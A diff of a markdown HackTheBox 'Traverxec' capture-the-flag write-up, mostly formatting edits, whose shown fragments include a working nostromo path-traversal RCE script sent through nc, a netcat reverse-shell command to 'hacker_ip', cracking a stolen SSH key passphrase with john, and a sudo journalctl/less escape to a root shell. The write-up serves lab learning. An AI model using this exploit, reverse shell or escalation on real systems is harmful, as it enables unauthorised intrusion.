@@ -1,4 +1,11 @@
-# Traverxec
+<!--GEN_META
+GEN_TITLE=HackTheBox Traverxec
+GEN_DESCRIPTION=How to own Traverxec on HackTheBox
+GEN_KEYWORDS=writeup,hackthebox,htb,cybersec
+GEN_AUTHOR=Máté Kukri
+GEN_TIMESTAMP=2020-04-16 15:39
+GEN_COPYRIGHT=Copyright (C) Máté Kukri, 2020
+-->
 This is the first box I have ever owned, so some steps might be sub-optimal,
 but I shall present how to own Traverxec own HackTheBox.
 
@@ -65,8 +72,7 @@ Server: nostromo 1.9.6
 Connection: close
 Last-Modified: Fri, 25 Oct 2019 18:34:30 GMT
 Content-Length: 1395
-Content-Type: text/html
-
+Content-Type: text/html<br>
 root:x:0:0:root:/root:/bin/bash
 ...
 david:x:1000:1000:david,,,:/home/david:/bin/bash
@@ -81,8 +87,8 @@ as nostromo itself has.
 
 The following shell script implements this.
 <pre>
-#!/bin/sh
-# Usage: rce.sh ip command
+\#!/bin/sh
+\# Usage: rce.sh ip command
 printf "POST /.%%0d./.%%0d./.%%0d./.%%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n$2 2>&1\n" | nc $1 80
 </pre>
 
@@ -98,8 +104,7 @@ debian $ nc -lvp 9999
 www-data@traverxec $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@traverxec $ hostname
-traverxec
-
+traverxec<br>
 Second shell on hacker computer:
 debian $ ./rce.sh 10.10.10.165 "nc hacker_ip 9999 -e /bin/sh"
 </pre>
@@ -107,7 +112,7 @@ debian $ ./rce.sh 10.10.10.165 "nc hacker_ip 9999 -e /bin/sh"
 ## Step 3: Owning david
 Using the reverse shell from the last step I enumerate what can I access as
 `www-data`.
- 
+
 Let's see what files can I access. Only interesting/unusual files are shown
 here, otherwise it would fill the page.
 <pre>
@@ -139,8 +144,7 @@ I take a look at `nhttpd.conf` and it contains the following interesting section
 <pre>
 www-data@traverxec $ cat /var/nostromo/conf/nhttpd.conf
 ...
-# HOMEDIRS [OPTIONAL]
-
+\# HOMEDIRS [OPTIONAL]<br>
 homedirs            /home
 homedirs_public     public_www
 ...
@@ -182,8 +186,8 @@ debian $ john --wordlist=rockyou.txt id_david_hash
 ...
 debian $ ssh-keygen -p -f id_david
 Enter old passphrase: hunter
-Enter new passphrase (empty for no passphrase): 
-Enter same passphrase again: 
+Enter new passphrase (empty for no passphrase):
+Enter same passphrase again:
 Your identification has been saved with the new passphrase.
 </pre>
 
@@ -228,8 +232,7 @@ of the webserver log, but most importantly does **not** require a password to do
 it. Now we look at the code and see why.
 <pre>
 david@traverxec $ cat /home/david/bin/server-stats.sh
-#!/bin/bash
-
+\#!/bin/bash<br>
 cat /home/david/bin/server-stats.head
 echo "Load: `/usr/bin/uptime`"
 echo " "
@@ -246,7 +249,6 @@ Thus we make our terminal window tiny, and run the `journalctl` command.
 <pre>
 david@traverxec $ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 </pre>
-
 Now we have `less` running as `root` under our control. Since it has a convenient
 `vim`-like command execution feature we just type `!/bin/sh` and we have a `root`
 shell. Now we just `cat` the root flag and we are done ;)
